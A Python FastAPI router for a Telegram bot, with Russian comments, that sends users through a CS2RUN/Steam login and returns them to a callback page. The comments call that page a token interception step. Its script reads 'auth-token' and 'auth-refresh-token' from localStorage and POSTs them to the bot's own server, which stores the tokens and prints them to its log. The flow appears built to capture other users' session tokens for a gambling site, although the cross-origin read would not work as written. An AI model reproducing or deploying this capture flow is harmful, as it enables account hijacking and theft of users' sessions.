from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, RedirectResponse
import urllib.parse
import json

from main import RAM_DATA

router = APIRouter()
SELF_URL = "https://tg-bot-test-gkbp.onrender.com"

# ============================================================
# 1️⃣ Точка входа для пользователя
# ============================================================

@router.get("/auth/login")
async def auth_login(chat_id: int):
    """
    Сюда ведёт кнопка из Telegram.
    Запускает официальный поток авторизации CS2RUN → Steam.
    """
    return_url = f"{SELF_URL}/auth/callback?chat_id={chat_id}"
    url = f"https://cs2run.app/auth/1/get-url/?return_url={urllib.parse.quote(return_url)}"
    return RedirectResponse(url)

# ============================================================
# 2️⃣ Страница перехвата токенов (уже после csgoyz.run)
# ============================================================

@router.get("/auth/callback")
async def auth_callback(chat_id: int = Query(...)):
    """
    Эта страница открывается в браузере пользователя.
    Ждёт, пока csgoyz.run запишет токены в localStorage.
    """
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head><title>Авторизация…</title></head>
<body>
<h3>🔐 Завершаем вход…</h3>

<script>
(async () => {{
    function sleep(ms) {{ return new Promise(r => setTimeout(r, ms)); }}

    for (let i = 0; i < 60; i++) {{
        const token = localStorage.getItem("auth-token");
        const refresh = localStorage.getItem("auth-refresh-token");

        if (token && refresh) {{
            await fetch("{SELF_URL}/bot/receive?chat_id={chat_id}", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ token, refresh }})
            }});

            document.body.innerHTML = "<h3>✅ Вход выполнен. Можно закрыть окно.</h3>";
            if (window.Telegram?.WebApp) Telegram.WebApp.close();
            return;
        }}

        await sleep(300);
    }}

    document.body.innerHTML = "<h3>❌ Не удалось получить токены</h3>";
}})();
</script>
</body>
</html>
""")

# ============================================================
# 3️⃣ Сервер принимает токены
# ============================================================

@router.post("/bot/receive")
async def receive_tokens(chat_id: int, payload: dict):
    if chat_id not in RAM_DATA:
        RAM_DATA[chat_id] = {}

    RAM_DATA[chat_id]["access_token"] = payload["token"]
    RAM_DATA[chat_id]["refresh_token"] = payload["refresh"]

    print(f"\n🔥 TOKENS FOR {chat_id}:\n{json.dumps(payload, indent=2)}\n")

    return {"ok": True}